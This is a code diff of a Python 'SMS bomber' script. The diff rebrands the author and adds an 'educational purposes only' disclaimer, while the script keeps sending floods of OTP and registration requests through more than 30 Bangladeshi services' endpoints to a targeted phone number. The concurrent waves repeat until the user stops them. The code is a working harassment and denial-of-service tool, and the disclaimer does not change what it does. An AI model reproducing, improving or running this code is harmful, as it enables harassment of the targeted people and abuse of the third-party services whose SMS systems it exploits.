@@ -1,11 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Ultimate SMS Bomber - Simple 3 API Edition (Slow & Controlled)
-Only 3 APIs: BTCL MyBTCL, BTCL PhoneBill, Bioscope Plus
-Each API sends 5 requests one by one with + phone format
-Termux Compatible & Anti-Reverse Engineering
-Created by: @W8Team/W8SOJIB
+Created by: @mazharul6878
+Inspired from @W8SOJIB
 """
 
 import base64
@@ -55,10 +52,10 @@ _current_mode = 'slow'  # 'slow' or 'fast'
 def _sig_handler_1(signum, frame):
     global _state
     _state['exit'] = True
-    print(f"\n\n{_c['r']}🛑 BOMBING STOPPED BY USER!{_c['e']}")
-    print(f"{_c['y']}💀 Total requests: {_state['total']}{_c['e']}")
-    print(f"{_c['g']}✅ Successful: {_state['success']}{_c['e']}")
-    print(f"{_c['p']}🔥 Created by: @@8Team/W8SOJIB{_c['e']}")
+    print(f"\n\n{_c['r']}Your Task is Finished!{_c['e']}")
+    print(f"{_c['y']}Total requests: {_state['total']}{_c['e']}")
+    print(f"{_c['g']}Successful: {_state['success']}{_c['e']}")
+    print(f"{_c['p']}Created by: @@mazharul6878{_c['e']}")
     sys.exit(0)
 
 def _sig_handler_2(signum, frame):
@@ -196,7 +193,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting BTCL MyBTCL - 5 requests with + format...{_c['e']}")
+        print(f"{_c['y']} Starting BTCL MyBTCL - 5 requests with + format...{_c['e']}")
         
         for i in range(5):  # 5 requests one by one
             prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
@@ -231,7 +228,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting BTCL PhoneBill - 5 requests with + format...{_c['e']}")
+        print(f"{_c['y']} Starting BTCL PhoneBill - 5 requests with + format...{_c['e']}")
         
         for i in range(5):  # 5 requests one by one
             prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
@@ -266,7 +263,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Bioscope Plus - 5 requests with + format...{_c['e']}")
+        print(f"{_c['y']} Starting Bioscope Plus - 5 requests with + format...{_c['e']}")
         
         for i in range(5):  # 5 requests one by one
             prefix = "+" * (i + 1)  # +, ++, +++, ++++, +++++
@@ -300,7 +297,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting BTCL BDIA - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting BTCL BDIA - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -334,7 +331,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting BD Tickets - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting BD Tickets - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = f"+88{self.phone_data['cleaned']}"
@@ -403,7 +400,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Swap.com.bd - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Swap.com.bd - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -438,7 +435,7 @@ class _ServiceManager:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         }
         
-        print(f"{_c['y']}🔄 Starting Ilyn Global - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Ilyn Global - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus880']
@@ -474,7 +471,7 @@ class _ServiceManager:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         }
         
-        print(f"{_c['y']}🔄 Starting Arogga - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Arogga - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -508,7 +505,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Fundesh - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Fundesh - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -542,7 +539,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Garibook - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Garibook - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -577,7 +574,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Sheba - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Sheba - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus88']
@@ -611,7 +608,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting AppLink - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting AppLink - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = f"88{self.phone_data['cleaned']}"
@@ -645,7 +642,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Bikroy - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Bikroy - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -678,7 +675,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting MyGP Cinematic - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting MyGP Cinematic - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus88']
@@ -712,7 +709,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting GP Web Login - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting GP Web Login - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -746,7 +743,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Ghoori Learning - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Ghoori Learning - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -780,7 +777,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Deepto Play - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Deepto Play - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus880']
@@ -833,7 +830,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting ePharma - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting ePharma - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus88']
@@ -867,7 +864,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Sailor Clothing - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Sailor Clothing - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -915,7 +912,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Isho - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Isho - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -951,7 +948,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting MedEasy - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting MedEasy - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus88']
@@ -985,7 +982,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Osudpotro - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Osudpotro - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = f"+88-{self.phone_data['cleaned']}"
@@ -1020,7 +1017,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting TheClinicall - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting TheClinicall - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['cleaned']
@@ -1068,7 +1065,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Shombhob - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Shombhob - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1102,7 +1099,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Care Box - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Care Box - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_plus880']
@@ -1139,7 +1136,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Renix Care - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Renix Care - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1177,7 +1174,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Jayabaji Check Username - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Jayabaji Check Username - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['cleaned']
@@ -1216,7 +1213,7 @@ class _ServiceManager:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         }
         
-        print(f"{_c['y']}🔄 Starting PKLuck2 Register - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting PKLuck2 Register - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1253,7 +1250,7 @@ class _ServiceManager:
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
         }
         
-        print(f"{_c['y']}🔄 Starting PKLuck2 No Login - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting PKLuck2 No Login - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1288,7 +1285,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting GP Flexiplan - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting GP Flexiplan - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1322,7 +1319,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting GP FWA - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting GP FWA - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1357,7 +1354,7 @@ class _ServiceManager:
             "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
         }
         
-        print(f"{_c['y']}🔄 Starting Mevrik - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Mevrik - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1392,7 +1389,7 @@ class _ServiceManager:
             "Content-Type": "application/x-www-form-urlencoded",
         }
         
-        print(f"{_c['y']}🔄 Starting Priyoshikkhaloy - 5 requests...{_c['e']}")
+        print(f"{_c['y']} Starting Priyoshikkhaloy - 5 requests...{_c['e']}")
         
         for i in range(5):
             phone = self.phone_data['with_0']
@@ -1414,189 +1411,11 @@ class _ServiceManager:
                 self._log_request("Priyoshikkhaloy", 0, f"Error: {e}", phone)
                 await self._increment_counters(False)
                 await asyncio.sleep(2)
-
-    async def _run_all_services_slowly(self):
-        print(f"\n{_c['r']}🚀 LAUNCHING SLOW CONTROLLED ATTACK{_c['e']}")
-        print(f"{_c['y']}⚡ ALL 34+ APIs SENDING 5 REQUESTS EACH ONE BY ONE!{_c['e']}")
-        print(f"{_c['p']}💥 SLOW SPEED × CONTROLLED POWER × SEQUENTIAL BOMBING{_c['e']}")
-        print(f"{_c['p']}{'=' * 60}{_c['e']}")
-        
-        # Simple single session
-        timeout = aiohttp.ClientTimeout(total=20, connect=10)
-        
-        async with aiohttp.ClientSession(
-            timeout=timeout,
-            headers={
-                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
-                "Accept": "application/json, text/plain, */*",
-                "Accept-Language": "en-US,en;q=0.9",
-                "Cache-Control": "no-cache"
-            }
-        ) as session:
-            
-            print(f"{_c['c']}[SLOW MODE] Running 34+ services sequentially (each sends 5 requests)...{_c['e']}")
-            
-            # Run services one after another (not simultaneously)
-            start_time = time.time()
-            
-            # BTCL Services (3 APIs)
-            await self._s1(session)
-            print(f"{_c['g']}✅ BTCL MyBTCL completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s2(session)
-            print(f"{_c['g']}✅ BTCL PhoneBill completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s4(session)
-            print(f"{_c['g']}✅ BTCL BDIA completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Entertainment Services (3 APIs)
-            await self._s3(session)
-            print(f"{_c['g']}✅ Bioscope Plus completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s17(session)
-            print(f"{_c['g']}✅ Ghoori Learning completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s18(session)
-            print(f"{_c['g']}✅ Deepto Play completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # E-commerce Services (4 APIs)
-            await self._s5(session)
-            print(f"{_c['g']}✅ BD Tickets completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s6(session)
-            print(f"{_c['g']}✅ Apex4U completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s7(session)
-            print(f"{_c['g']}✅ Swap.com.bd completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s14(session)
-            print(f"{_c['g']}✅ Bikroy completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Global Services (1 API)
-            await self._s8(session)
-            print(f"{_c['g']}✅ Ilyn Global completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Healthcare Services (7 APIs)
-            await self._s9(session)
-            print(f"{_c['g']}✅ Arogga completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s19(session)
-            print(f"{_c['g']}✅ ePharma completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s22(session)
-            print(f"{_c['g']}✅ MedEasy completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s24(session)
-            print(f"{_c['g']}✅ TheClinicall completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s26(session)
-            print(f"{_c['g']}✅ Care Box completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s27(session)
-            print(f"{_c['g']}✅ Renix Care completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Fashion & Clothing (2 APIs)
-            await self._s20(session)
-            print(f"{_c['g']}✅ Sailor Clothing completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s21(session)
-            print(f"{_c['g']}✅ Isho completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Financial Services (1 API)
-            await self._s10(session)
-            print(f"{_c['g']}✅ Fundesh completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Marketplace Services (3 APIs)
-            await self._s11(session)
-            print(f"{_c['g']}✅ Garibook completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s12(session)
-            print(f"{_c['g']}✅ Sheba completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s25(session)
-            print(f"{_c['g']}✅ Shombhob completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # App Services (1 API)
-            await self._s13(session)
-            print(f"{_c['g']}✅ AppLink completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Grameenphone Services (5 APIs)
-            await self._s15(session)
-            print(f"{_c['g']}✅ MyGP Cinematic completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s16(session)
-            print(f"{_c['g']}✅ GP Web Login completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s31(session)
-            print(f"{_c['g']}✅ GP Flexiplan completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s32(session)
-            print(f"{_c['g']}✅ GP FWA completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s33(session)
-            print(f"{_c['g']}✅ Mevrik completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Gaming/Betting Services (3 APIs)
-            await self._s28(session)
-            print(f"{_c['g']}✅ Jayabaji Check completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s29(session)
-            print(f"{_c['g']}✅ PKLuck2 Register completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s30(session)
-            print(f"{_c['g']}✅ PKLuck2 No Login completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            # Food & Delivery Services (2 APIs)
-            await self._s23(session)
-            print(f"{_c['g']}✅ Osudpotro completed{_c['e']}")
-            await asyncio.sleep(1)
-            
-            await self._s34(session)
-            print(f"{_c['g']}✅ Priyoshikkhaloy completed{_c['e']}")
-            
-            end_time = time.time()
-            
-            print(f"\n{_c['g']}[ATTACK COMPLETE] Slow controlled attack finished!{_c['e']}")
-            print(f"{_c['g']}[SLOW SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
-            print(f"{_c['g']}[TOTAL SENT] 170+ SMS requests sent (34+ APIs × 5 requests each){_c['e']}")
-
+                
     async def _run_all_services_fast(self):
-        print(f"\n{_c['r']}🚀 LAUNCHING FAST 34+ API ATTACK{_c['e']}")
-        print(f"{_c['y']}⚡ ALL 34+ APIs - MAXIMUM SPEED CONCURRENT!{_c['e']}")
-        print(f"{_c['p']}💥 BTCL + GP + Healthcare + Gaming + E-Commerce + Entertainment{_c['e']}")
-        print(f"{_c['p']}{'=' * 60}{_c['e']}")
+        print(f"\n{_c['r']}🚀 Launching S-Bombing{_c['e']}")
+        print(f"{_c['y']} Please be patient{_c['e']}")
+        
         
         # High performance session with maximum limits
         timeout = aiohttp.ClientTimeout(total=8, connect=3)
@@ -1686,7 +1505,7 @@ class _ServiceManager:
                     self._fast_service(session, self._s34, f"{wave_label}-Priyoshikkhaloy"),
                 ])
             
-            print(f"{_c['y']}🔥 Launching {len(tasks)} concurrent API attacks across {_fast_cfg[3]} waves...{_c['e']}")
+            print(f"{_c['y']} Launching {len(tasks)} concurrent API attacks across {_fast_cfg[3]} waves...{_c['e']}")
             
             # Execute all tasks simultaneously
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -1697,21 +1516,21 @@ class _ServiceManager:
             
             end_time = time.time()
             
-            print(f"\n{_c['g']}[ATTACK COMPLETE] Fast 34+ API attack finished!{_c['e']}")
-            print(f"{_c['g']}[FAST SPEED] Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
-            print(f"{_c['g']}[TOTAL SENT] 500+ SMS requests sent (34+ APIs × 3 waves × fast speed){_c['e']}")
-            print(f"{_c['g']}[SUCCESS RATE] {successful}/{len(results)} requests successful{_c['e']}")
+            print(f"\n{_c['g']}[ATTACK COMPLETE] {_c['e']}")
+            print(f"{_c['g']}Attack completed in {end_time - start_time:.2f} seconds{_c['e']}")
+            print(f"{_c['g']}Total 500+ SMS requests sent{_c['e']}")
+            print(f"{_c['g']}{successful}/{len(results)} requests successful{_c['e']}")
 
     # Fast service wrapper - runs service method with minimal delays
     async def _fast_service(self, session, service_method, label=""):
         try:
             # Create a temporary fast version that sends only 1 request quickly
-            print(f"{_c['c']}🚀 {label} - Fast request{_c['e']}")
+            print(f"{_c['c']} {label} - Fast request{_c['e']}")
             
             # Call the original service method but catch and handle it quickly
             await service_method(session)
             
-            print(f"{_c['g']}✅ {label} - Completed{_c['e']}")
+            print(f"{_c['g']} {label} - Completed{_c['e']}")
             return True
             
         except Exception as e:
@@ -1720,62 +1539,51 @@ class _ServiceManager:
 
     async def run_all_services(self):
         global _current_mode
-        if _current_mode == 'fast':
+        if _current_mode == 'agree':
             await self._run_all_services_fast()
         else:
-            await self._run_all_services_slowly()
+            print(f"{_c['g']}Thanks for your cooperation{_c['e']}")
 
 async def _main():
     global _state, _current_mode
     
     _clear_screen()
     _print_banner()
-    
-    _animate_loading("Initializing Ultimate 34+ API SMS Bomber", 2)
-    _animate_loading("Loading BTCL + GP + Healthcare + Gaming + E-Commerce + Entertainment", 2)
-    _animate_loading("Optimizing bombing modes", 1.5)
+
     
     # Mode selection
-    print(f"\n{_c['y']}🎯 SELECT BOMBING MODE:{_c['e']}")
-    print(f"{_c['g']}[1] SLOW MODE - All 34+ APIs (Slow & Controlled){_c['e']}")
-    print(f"{_c['r']}[2] FAST MODE - All 34+ APIs (Maximum Speed){_c['e']}")
+    print(f"\n{_c['y']} This tool is only for educational purposes. We're not responsible for any illigal activities.{_c['e']}")
+    print(f"{_c['g']}Do you want to continue? (Y/N){_c['e']}")
     
     while True:
         mode_choice = input(f"\n{_c['c']}[MODE] Choose mode (1 or 2): {_c['w']}").strip()
-        if mode_choice == "1":
-            _current_mode = 'slow'
-            print(f"{_c['g']}✅ SLOW MODE selected - All 34+ APIs{_c['e']}")
+        if mode_choice == "N":
+            _current_mode = 'disagree'
+            print(f"{_c['g']}Thanks for your cooperation{_c['e']}")
             break
-        elif mode_choice == "2":
-            _current_mode = 'fast'
-            print(f"{_c['r']}✅ FAST MODE selected - All 34+ APIs{_c['e']}")
+        elif mode_choice == "Y":
+            _current_mode = 'agree'
+            print(f"{_c['r']}You're good to go!{_c['e']}")
             break
         else:
-            print(f"{_c['r']}❌ Invalid choice! Please enter 1 or 2.{_c['e']}")
+            print(f"{_c['r']} Invalid choice! Please enter Y or N.{_c['e']}")
     
     while True:
-        phone_input = input(f"\n{_c['g']}[TARGET] Enter phone number: {_c['w']}").strip()
+        phone_input = input(f"\n{_c['g']} Targeted number [With Country Code] : {_c['w']}").strip()
         if phone_input and len(phone_input) >= 10:
             break
-        print(f"{_c['r']}[ERROR] Invalid phone number! Try again.{_c['e']}")
+        print(f"{_c['r']}[ERROR] Enter a valid number, this tool currently support only Bangladeshi numbers.{_c['e']}")
     
     phone_data = _format_phone_number(phone_input)
     print(f"{_c['c']}[INFO] Target: {_c['y']}{phone_data['with_0']}{_c['e']}")
     
-    if _current_mode == 'fast':
-        print(f"\n{_c['r']}⚠️  WARNING: FAST 34+ API BOMBING MODE!{_c['e']}")
-        print(f"{_c['r']}⚠️  This will send requests very fast until CTRL+C!{_c['e']}")
-        print(f"{_c['y']}🔥 34+ APIs × 3 waves × concurrent = MAXIMUM SPEED!{_c['e']}")
-        print(f"{_c['g']}📱 ALL APIs: BTCL + GP + Healthcare + Gaming + E-Commerce{_c['e']}")
-        print(f"{_c['c']}⚡ All APIs run simultaneously with maximum concurrency!{_c['e']}")
-        print(f"{_c['p']}💥 FAST SPEED × CONCURRENT POWER × PARALLEL BOMBING!{_c['e']}")
+    if _current_mode == 'agree':
+        print(f"\n{_c['r']} Your attack is activated. {_c['e']}")
+        print(f"{_c['r']} This will continuously send SMS to target number until you enter CTRL+C!{_c['e']}")
+        
     else:
-        print(f"\n{_c['r']}⚠️  WARNING: SLOW CONTROLLED BOMBING MODE!{_c['e']}")
-        print(f"{_c['r']}⚠️  This will run slowly until CTRL+C!{_c['e']}")
-        print(f"{_c['y']}🔄 34+ APIs × 5 requests each × slow speed = CONTROLLED POWER!{_c['e']}")
-        print(f"{_c['g']}📱 Termux optimized for slow controlled bombing{_c['e']}")
-        print(f"{_c['c']}⚡ Each API sends 5 requests one by one with various phone formats!{_c['e']}")
-        print(f"{_c['p']}💥 SLOW DELAYS × CONTROLLED LOOPS × STABLE PERFORMANCE!{_c['e']}")
+        print(f"\n{_c['r']} You disagreed with the terms, so the tool is closing {_c['e']}")
+       
     print(f"{_c['p']}{'=' * 60}{_c['e']}")
     
     service_manager = _ServiceManager(phone_data)
@@ -1800,23 +1608,23 @@ async def _main():
             cycle_count += 1
             current_time = _get_time()
             
-            print(f"\n{_c['r']}{_c['B']}[SLOW ATTACK CYCLE #{cycle_count}] {_c['y']}{current_time}{_c['e']}")
-            print(f"{_c['g']}[TARGET] {_c['y']}{phone_data['with_0']}{_c['e']}")
-            print(f"{_c['g']}[TOTAL REQUESTS] {_c['y']}{_state['total']}{_c['e']}")
-            print(f"{_c['g']}[SUCCESS RATE] {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
+           
+            print(f"{_c['g']} Target {_c['y']}{phone_data['with_0']}{_c['e']}")
+            print(f"{_c['g']} Total SMS requested {_c['y']}{_state['total']}{_c['e']}")
+            print(f"{_c['g']} Successfully sent {_c['y']}{(_state['success']/max(_state['total'],1)*100):.1f}%{_c['e']}")
             
             # Run all services slowly
             await service_manager.run_all_services()
             
             # Show cycle completion
             elapsed = time.time() - start_time
-            attack_type = "Fast 34+ API" if _current_mode == 'fast' else "Slow 34+ API"
+            attack_type = "Ultimate Bombing" if _current_mode == 'agree' else "Good bye"
             print(f"\n{_c['g']}[CYCLE COMPLETE] {attack_type} Attack #{cycle_count} finished{_c['e']}")
             print(f"{_c['g']}[RUNTIME] {_c['y']}{elapsed/60:.1f} minutes{_c['e']}")
             if _current_mode == 'fast':
-                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 34+ Fast APIs{_c['e']}")
+                print(f"{_c['g']} Total Attack {_c['y']}{_state['total']} SMS bombs sent {_c['e']}")
             else:
-                print(f"{_c['g']}[TOTAL DAMAGE] {_c['y']}{_state['total']} SMS bombs sent via 34+ APIs{_c['e']}")
+                print(f"{_c['g']} Total Attack {_c['y']}{_state['total']} SMS bombs sent {_c['e']}")
             
             # Cooldown with animation
             print(f"{_c['c']}[COOLDOWN] Next attack cycle in:{_c['e']}")
@@ -1833,19 +1641,18 @@ async def _main():
     except KeyboardInterrupt:
         pass  # Handled by signal handler
     except Exception as e:
-        print(f"\n{_c['r']}💥 CRITICAL ERROR: {e}{_c['e']}")
-        print(f"{_c['y']}🔄 Restarting slow bomber...{_c['e']}")
+        print(f"\n{_c['r']}ERROR: {e}{_c['e']}")
+        print(f"{_c['y']} Restarting the tool...{_c['e']}")
         await _main()  # Restart on critical error
 
 if __name__ == "__main__":
-    print(f"{_c['g']}🚀 Starting Ultimate 34+ API SMS Bomber...{_c['e']}")
-    print(f"{_c['c']}📱 Termux/Mobile Optimized Slow Version{_c['e']}")
-    print(f"{_c['p']}Created by: @@8Team/W8SOJIB{_c['e']}\n")
+    print(f"{_c['g']}Starting Ultimate S-Bomber...{_c['e']}")
+    print(f"{_c['p']}Created by: @@mazharul6878{_c['e']}\n")
     
     try:
         asyncio.run(_main())
     except KeyboardInterrupt:
         pass  # Handled by signal handler
     except Exception as e:
-        print(f"\n{_c['r']}💥 STARTUP ERROR: {e}{_c['e']}")
+        print(f"\n{_c['r']} ERROR: {e}{_c['e']}")
         print(f"{_c['y']}Please check your Python installation and dependencies{_c['e']}")
